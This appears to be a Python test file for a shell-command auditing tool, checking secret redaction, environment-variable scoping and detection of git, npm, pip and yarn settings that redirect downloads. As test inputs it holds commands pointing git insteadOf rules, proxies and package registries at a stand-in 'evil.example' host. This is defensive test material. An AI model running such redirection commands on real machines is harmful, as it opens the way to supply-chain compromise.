"""Review r3, final pass (R3F1-R3F7): whole-value masking, every cookie pair,
tokens glued to escapes, bash scoping of environment and config effects,
IDNA deviation characters, and config written earlier in the same command.

Every value is synthetic and assembled at runtime; scans run under the temp
HOME _fixtures sets up. No network.
"""
from __future__ import annotations

import random
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import _fixtures  # noqa: E402,F401  (first: a temp HOME, agent homes and cwd for the whole run)
from test_review_r2_X import af, run_cli  # noqa: E402
from test_review_r3_INV import GateCase, items, net_items  # noqa: E402
from _timing import budget, clock  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
_ALNUM = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"


def rnd(n, seed):
    r = random.Random(seed)
    return "".join(r.choice(_ALNUM) for _ in range(n))


def kinds(cmd):
    return {k for _p, k, _fp in af.classify_secrets(cmd)}


class _Redaction(unittest.TestCase):
    def assert_masked(self, cmd, secret, kind=None):
        out = af.redact(cmd)
        self.assertNotIn(secret, out, cmd[:80])
        self.assertEqual(af.redact(out), out, "not idempotent")
        found = kinds(cmd)
        self.assertTrue(found, ("masked but not counted", cmd[:80]))
        if kind:
            self.assertIn(kind, found, cmd[:80])
        return out


# --- R3F1: no mask stops at a fixed length ------------------------------------

class TestR3F1WholeValue(_Redaction):
    TOK = rnd(400, 2)

    def test_long_option_value_is_masked_whole(self):
        tok = self.TOK
        for cmd in (f"aws s3 ls --session-token {tok}", f"sudo aws s3 ls --session-token {tok}",
                    f"tool --token {tok}", f"tool --password {tok}",
                    f"wget --http-password {tok} https://a.example/f", f"curl -u bob:{tok} https://a.example",
                    f"docker login -u u -p {tok}", f"aws configure set aws_session_token {tok}",
                    f"gh secret set X --body {tok}", f"echo 'machine h.example login u password {tok}'"):
            with self.subTest(cmd=cmd[:40]):
                self.assert_masked(cmd, tok[-40:], "password option")

    def test_long_cookie_is_masked_whole(self):
        self.assert_masked(f"curl -b sid={self.TOK} https://a.example", self.TOK[-40:], "cookie")

    def test_long_quoted_named_value_with_spaces(self):
        tok = self.TOK
        for cmd in (f"export TOKEN='{tok[:200]} {tok[200:]}'", f'DB_PASSWORD="{tok[:300]} {tok[300:]}" psql'):
            with self.subTest(cmd=cmd[:30]):
                self.assert_masked(cmd, tok[-40:])

    def test_long_scp_password(self):
        self.assert_masked(f"scp f bob:{self.TOK}@host.example:/tmp", self.TOK[-40:], "scp password")

    def test_long_pem_body(self):
        body = "\n".join(rnd(64, k) for k in range(300))          # 19 KB, past the old 16 KB cap
        cmd = f"printf -- '-----BEGIN RSA PRIVATE KEY-----\n{body}\n-----END RSA PRIVATE KEY-----'"
        self.assert_masked(cmd, body[-40:], "private key")

    def test_short_values_unchanged(self):
        for cmd in ("tool --token $GITHUB_TOKEN", "tool --password --verbose", "curl -u 1000:1000 x"):
            self.assertEqual(af.redact(cmd), cmd)


# --- R3F2: quoted values to the closing quote ----------------------------------

class TestR3F2QuotedValues(_Redaction):
    def test_quoted_option_value_is_masked_whole(self):
        for cmd in ('tool --api-key "Tr0ub4 dor and3 horse"', "tool --passphrase 'Tr0ub4 dor and3 horse'",
                    'wget --password "Tr0ub4 dor and3 horse" https://a.example/f',
                    "tool --passphrase $'Tr0ub4 dor\\' and3 horse'", 'tool --passphrase "my and3 horse"',
                    "curl -u 'bob:Tr0ub4 dor and3 horse' https://a.example",
                    "docker login -u u -p 'Tr0ub4 dor and3 horse'"):
            with self.subTest(cmd=cmd):
                out = self.assert_masked(cmd, "and3 horse", "password option")
                self.assertNotIn("dor", out)

    def test_quoted_named_values(self):
        for cmd in ('PASSWORD="Tr0ub4 dor and3 horse" x', "export DB_PASSPHRASE=$'Tr0ub4 dor\\' and3 horse'",
                    "export PGPASSWORD='Tr0ub4 dor;and3 horse' && psql"):
            with self.subTest(cmd=cmd):
                self.assert_masked(cmd, "and3 horse")
        for cmd in ("export API_KEY='Tr0ub4 dor and3 horse'", "export API_KEY=$'Tr0ub4 dor\\' and3 horse'"):
            with self.subTest(cmd=cmd):
                self.assertNotIn("and3 horse", af.redact(cmd))

    def test_rest_of_the_line_stays(self):
        out = af.redact("tool --api-key 'Tr0ub4 dor and3 horse' --verbose")
        self.assertTrue(out.endswith("' --verbose"), out)


# --- R3F3: every cookie pair ---------------------------------------------------

class TestR3F3Cookies(_Redaction):
    SID = "Ak25eiRREiia9ap3pk9k"

    def test_every_cookie_pair_is_masked(self):
        sid = self.SID
        for cmd in (f"curl -H 'Cookie: theme=dark; sid={sid}' https://a.example",
                    f"curl -b 'theme=dark; sid={sid}' https://a.example",
                    f'curl --cookie "theme=dark;session_id={sid}" https://a.example',
                    f"curl -bsid={sid} https://a.example",
                    f"curl -H 'Set-Cookie: sid={sid}; Path=/; HttpOnly' https://a.example",
                    f'curl -d "{{\\"Cookie\\": \\"theme=dark; auth={sid}\\"}}" https://a.example'):
            with self.subTest(cmd=cmd):
                self.assert_masked(cmd, sid[4:])
                self.assertTrue(kinds(cmd) & {"cookie", "AUTH"}, cmd)
        out = af.redact(f"curl -H 'Set-Cookie: sid={sid}; Path=/; HttpOnly' https://a.example")
        self.assertIn("sid=<redacted>; Path=/; HttpOnly", out)

    def test_harmless_pairs_stay_readable(self):
        out = af.redact(f"curl -H 'Cookie: theme=dark; lang=en; sid={self.SID}' https://a.example")
        self.assertIn("theme=dark; lang=en; sid=<redacted>", out)
        self.assertEqual(kinds("curl -H 'Cookie: theme=dark; lang=en' https://a.example"), set())
        self.assertEqual(af.redact("curl -b 'theme=dark' https://a.example"), "curl -b 'theme=dark' https://a.example")

    def test_shape_and_opaque_values_under_any_name(self):
        tok = "ghp_" + rnd(36, 7)
        self.assert_masked(f"curl -H 'Cookie: theme=dark; x={tok}' https://a.example", tok[8:], "GitHub PAT")
        opaque = rnd(24, 8) + "7"
        self.assert_masked(f"curl -b 'theme=dark; foo={opaque}' https://a.example", opaque[4:], "cookie")

    def test_each_secret_pair_counted_once(self):
        found = af.classify_secrets(f"curl -H 'Cookie: sid={self.SID}; csrf={self.SID[::-1]}' https://a.example")
        self.assertEqual([k for _p, k, _f in found], ["cookie", "cookie"], found)
        self.assertEqual(len(af.classify_secrets(f"curl -b 'sid={self.SID}' -b 'sid={self.SID}' x")), 1)

    def test_value_without_pairs(self):
        self.assert_masked(f"curl -H 'Cookie: {self.SID}' https://a.example", self.SID[4:], "cookie")

    def test_cookie_file_and_variable(self):
        self.assertEqual(af.classify_secrets("curl -b cookies.txt https://a.example"), [])
        self.assert_masked(f"export SESSION_COOKIE={self.SID}", self.SID[4:])


# --- R3F4: tokens glued to an escape ------------------------------------------

class TestR3F4Escapes(_Redaction):
    TOK = "ghp_" + rnd(36, 4)

    def test_token_after_a_printf_escape_or_csi(self):
        tok = self.TOK
        for pre in ("x\\n", "x\\t", "x\\r", "\\x20", "\\040", "\\u0020", "\\e[2K", "\x1b[2K", "\\e(B",
                    "\\033[H", "\\x1b[1;2H", "\\e[38:2:255:0:0m", "\\e[1m", "\\E[0m"):
            cmd = f"printf '{pre}{tok}'"
            with self.subTest(pre=pre):
                self.assert_masked(cmd, tok[8:], "GitHub PAT")

    def test_netrc_through_printf_and_default_line(self):
        pw = rnd(14, 9)
        for cmd in (f"printf 'machine h.example\\nlogin u\\npassword {pw}' > ~/.netrc",
                    f"echo 'default login u password {pw}' >> ~/.netrc"):
            with self.subTest(cmd=cmd):
                self.assert_masked(cmd, pw, "password option")

    def test_glued_words_stay(self):
        for cmd in ("echo task-" + rnd(30, 10), "echo xghp_" + rnd(36, 11)):
            self.assertEqual(af.redact(cmd), cmd)


# --- R3F5: bash scoping of environment and config effects -----------------------

G = ("GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://good.example/.insteadOf "
     "GIT_CONFIG_VALUE_0=https://evil.example/")
R = "npm_config_registry=https://evil.example"


class TestR3F5Scope(GateCase):
    OUT_OF_SCOPE = [
        f"(export {G}); git clone https://evil.example/r",
        f"bash -c 'export {G}'; git clone https://evil.example/r",
        f"export {G} | cat; git clone https://evil.example/r",
        f"export {G} & git clone https://evil.example/r",
        f"f() {{ export {G}; }}; git clone https://evil.example/r",
        f"echo $(export {G}); git clone https://evil.example/r",
        f"false && export {G}; git clone https://evil.example/r",
        f"if false; then export {G}; fi; git clone https://evil.example/r",
        f"export {G}; env -i git clone https://evil.example/r",
        f"export {G}; env -u GIT_CONFIG_COUNT git clone https://evil.example/r",
        f"export {G}; unset GIT_CONFIG_COUNT; git clone https://evil.example/r",
        f"export {G}; export -n GIT_CONFIG_COUNT; git clone https://evil.example/r",
        f"(export npm_config_registry=https://good.example/); npm i evil@1.0.0",
    ]

    def test_export_that_does_not_reach_git_does_not_rewrite(self):
        self.assert_ioc_exit3(self.OUT_OF_SCOPE)

    def test_never_trusted(self):
        self.assert_untrusted(self.OUT_OF_SCOPE[:2] + self.OUT_OF_SCOPE[4:8], "good.example")

    def test_children_never_see_it(self):
        for c in self.OUT_OF_SCOPE[1:4] + self.OUT_OF_SCOPE[5:6] + self.OUT_OF_SCOPE[8:12]:
            with self.subTest(cmd=c[:30]):
                self.assertEqual([(i["host"], i.get("_unresolved")) for i in items(c)], [("evil.example", None)])

    def test_unknown_scope_is_unresolved_both_ways(self):
        for c in (self.OUT_OF_SCOPE[0], self.OUT_OF_SCOPE[4], self.OUT_OF_SCOPE[6], self.OUT_OF_SCOPE[7]):
            with self.subTest(cmd=c[:30]):
                got = items(c)
                self.assertEqual({i["host"] for i in got}, {"evil.example", "good.example"})
                self.assertTrue(all(i["_unresolved"] == "redirected" for i in got))

    def test_export_in_scope_still_applies(self):
        for c, host in ((f"export {G}; git clone https://evil.example/r", "good.example"),
                        (f"export {R}; npm i foo", "evil.example"),
                        (f"cd x && export {R} && npm i foo", "evil.example"),
                        (f"export {R}\nnpm i foo", "evil.example"),
                        (f"sleep 1 & export {R}; npm i foo", "evil.example"),
                        (f"export {R}; (npm i foo)", "evil.example"),
                        (f"export {R}; echo $(npm i foo)", "evil.example"),
                        (f"export {R}; sudo -E npm i foo", "evil.example"),
                        (f"{R} bash -c 'npm i foo'", "evil.example"),
                        (f"{R} bash <<EOF\nnpm i foo\nEOF", "evil.example"),
                        (f"bash -c 'export {R}; npm i foo'", "evil.example")):
            with self.subTest(cmd=c[:40]):
                got = items(c)
                self.assertIn(host, [i["host"] for i in got], got)
                if not c.startswith("bash -c"):
                    self.assertFalse(any(i.get("_unresolved") for i in got), got)

    def test_env_clears_for_that_command_only(self):
        c = f"export {R}; env -i npm i foo; npm i bar"
        self.assertEqual([i["host"] for i in items(c)], ["registry.npmjs.org", "evil.example"])
        self.assertEqual([i["host"] for i in items(f"env -i {R} npm i foo")], ["evil.example"])
        self.assertEqual([i["host"] for i in items(f"{R} env -i npm i foo")], ["registry.npmjs.org"])

    def test_sudo_may_reset(self):
        got = items(f"export {R}; sudo npm i foo")
        self.assertEqual({i["host"] for i in got}, {"evil.example", "registry.npmjs.org"})
        self.assertTrue(all(i["_unresolved"] for i in got))

    def test_unrelated_exports_change_nothing(self):
        for c in ("export PATH=/opt/bin:$PATH; npm i foo", "(export X=1); npm i foo",
                  "bash -c 'export FOO=1'; curl -o x https://good.example/x"):
            self.assertFalse(any(i.get("_unresolved") for i in items(c)), c)


# --- R3F6: IDNA deviation characters ---------------------------------------------

class TestR3F6IdnaDeviations(GateCase):
    def test_deviation_hosts_are_unresolved(self):
        for host in ("straße.example", "σοφος.example", "a‍b.example",
                     "a‌b.example", "STRAẞE.example", "stra%C3%9Fe.example"):
            with self.subTest(host=host):
                self.assertIsNone(af.url_host(f"https://{host}/x"))
                got = items(f"curl -o x https://{host}/x")
                self.assertEqual(got[0]["_unresolved"], "host-unresolved")

    def test_other_idna_still_normalises(self):
        self.assertEqual(af.url_host("https://bücher.example/"), "xn--bcher-kva.example")
        self.assertEqual(af.url_host("https://σοφοσ.example/"), "xn--0xaakcn.example")

    def test_gates(self):
        code, j = run_cli("curl -o x https://straße.example/x", fail_on="any",
                          ioc="host:xn--strae-oqa.example\n")
        self.assertEqual(code, 3)
        self.assertEqual({r["reason"] for r in j["network"]["ioc"]["matches"]}, {"host-unresolved"})
        self.assert_untrusted(["curl -o x https://straße.example/x"], "strasse.example")

    def test_documented(self):
        doc = (ROOT / "docs" / "ioc.md").read_text(encoding="utf-8")
        self.assertIn("UTS 46", doc)
        self.assertIn("U+00DF", doc)


# --- R3F7: config written earlier in the same command -----------------------------

class TestR3F7ConfigWrites(GateCase):
    SAME = [
        "git config --global url.https://evil.example/.insteadOf https://github.com/ "
        "&& git clone https://github.com/o/r",
        "git config --global http.proxy http://evil.example:3128; git clone https://github.com/o/r",
        "git config set --global url.https://evil.example/.insteadOf https://github.com/ "
        "&& git clone https://github.com/o/r",
        "npm config set registry https://evil.example/ && npm i lodash",
        "npm config set registry=https://evil.example/ && npm i lodash",
        "npm set registry https://evil.example/ && npm i lodash",
        "pnpm config set registry https://evil.example/ && pnpm add lodash",
        "yarn config set registry https://evil.example/ && yarn add lodash",
        "pip config set global.index-url https://evil.example/simple && pip install foo",
        "python3 -m pip config set global.index-url https://evil.example/simple && pip install foo",
    ]

    def test_ioc_sees_the_redirect(self):
        self.assert_ioc_exit3(self.SAME)

    def test_never_trusted(self):
        self.assert_untrusted(self.SAME[:1], "github.com")
        self.assert_untrusted(["npm config set registry https://evil.example/ && npm i lodash"],
                              "registry.npmjs.org")

    def test_local_or_unreadable_config_is_unresolved(self):
        for c in ("git config url.https://evil.example/.insteadOf https://github.com/ && "
                  "git clone https://github.com/o/r",
                  "echo registry=https://evil.example/ >> ~/.npmrc && npm i lodash",
                  "printf '[global]\\nindex-url = https://evil.example/simple\\n' | tee ~/.config/pip/pip.conf"
                  " && pip install foo"):
            with self.subTest(cmd=c[:40]):
                got = items(c)
                self.assertTrue(got and all(i.get("_unresolved") for i in got), got)

    def test_written_config_is_flagged(self):
        for c in ("npm config set registry https://evil.example/",
                  "git config --global url.https://evil.example/.insteadOf https://github.com/",
                  "pip config set global.index-url https://evil.example/simple",
                  "yarn config set npmRegistryServer https://evil.example/",
                  "echo registry=https://evil.example/ >> ~/.npmrc"):
            with self.subTest(cmd=c[:40]):
                self.assertIn(("med", "network-config"), [m[:2] for m in af.command_rule_matches(c)])
        for c in ("git config user.name bob", "npm config get registry", "git clone https://github.com/o/r"):
            self.assertNotIn("network-config", [m[1] for m in af.command_rule_matches(c)], c)

    def test_flag_in_the_report_for_a_separate_call(self):
        code, j = run_cli("npm config set registry https://evil.example/", "npm i lodash", fail_on="any")
        self.assertEqual(code, 3)
        flags = [f for f in j["bash"]["flags"] if "network-config" in f["categories"]]
        self.assertEqual(len(flags), 1, j["bash"]["flags"])
        self.assertEqual(flags[0]["severity"], "med")

    def test_documented(self):
        doc = (ROOT / "docs" / "ioc.md").read_text(encoding="utf-8")
        self.assertIn("network-config", doc)
        self.assertIn("network-config", (ROOT / "docs" / "findings.md").read_text(encoding="utf-8"))


# --- R10: linear at the caps ------------------------------------------------------

class TestTiming(unittest.TestCase):
    def test_redaction_rules_at_the_cap(self):
        n = af.MAX_SCAN_TOTAL
        probes = (
            "--token " + "a" * (n - 8),
            "--token '" * (n // 9),
            "--token \"a " * (n // 11),
            "TOKEN='" * (n // 7),
            "TOKEN=\"a " * (n // 9),
            "TOKEN=$'\\" * (n // 9),
            "curl -b 'a=" + "b; " * (n // 3),
            "curl " * (n // 10) + "-b 'a=" + "x" * (n // 2),
            "Cookie: " * (n // 8),
            "Cookie: a=b;" * (n // 12),
            "u:" + "=x:y" * (n // 4),
            "x=" + "a" * 300 + ":" + "b" * (n - 310),
            "-----BEGIN RSA PRIVATE KEY-----" * (n // 31),
            "\\n" * (n // 2),
            "\\nghp_" * (n // 6),
            "\\e[2K" * (n // 5),
            "[2Kghp_" * (n // 7),
            "machine h login u password " * (n // 27),
        )
        for text in probes:
            for fn in (af.redact, af.classify_secrets):
                with self.subTest(probe=text[:14], fn=fn.__name__):
                    t = clock()
                    fn(text)
                    self.assertLess(clock() - t, budget(1.0))

    def test_scope_analysis_is_linear(self):
        n = af.MAX_SCAN_HARD // 64
        probes = (
            f"export {R}; npm i foo; " * (n // 2),
            "export npm_config_registry=x; " * n,
            f"(export {R}); npm i a; " * (n // 2),
            "export A=1 && " * n + "npm i foo",
            "git config --global http.proxy http://p:1; " * (n // 2) + "git clone https://github.com/o/r",
        )
        for text in probes:
            with self.subTest(probe=text[:20]):
                af._WALK_CACHE[0] = None
                t = clock()
                af.network_items_from_command(text)
                af.command_rule_matches(text)
                self.assertLess(clock() - t, budget(4.0))


if __name__ == "__main__":
    unittest.main()
